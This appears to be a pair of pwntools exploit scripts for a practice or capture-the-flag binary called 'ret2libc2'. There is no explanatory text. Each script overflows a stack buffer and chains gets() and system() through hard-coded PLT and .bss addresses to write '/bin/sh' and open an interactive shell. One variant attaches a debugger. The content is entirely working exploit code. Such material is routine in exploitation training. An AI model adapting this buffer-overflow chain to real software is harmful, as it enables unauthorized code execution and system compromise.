from pwn import *
p = process('./ret2libc2')
context.terminal = ['tmux','splitw','-h']
sys_plt = 0x8048490
gets_plt = 0x8048460
bss_addr = 0x804A080#用0804A040就寄了

payload = flat(
'a'*(112),
p32(gets_plt),
p32(sys_plt),
p32(bss_addr),
p32(bss_addr)
)
gdb.attach(p)
p.sendline(payload)
p.sendline(b'/bin/sh')
p.interactive()


from pwn import *
p = process('./ret2libc2')

sys_plt = 0x8048490
gets_plt = 0x8048460
ebx_addr = 0x0804843d
bss_addr = 0x804A080#用0804A040就寄了

payload = flat(
'a'*(112),
p32(gets_plt),
p32(ebx_addr),
p32(bss_addr),
p32(sys_plt),
p32(0),
p32(bss_addr)
)

p.sendline(payload)
p.sendline(b'/bin/sh')
p.interactive()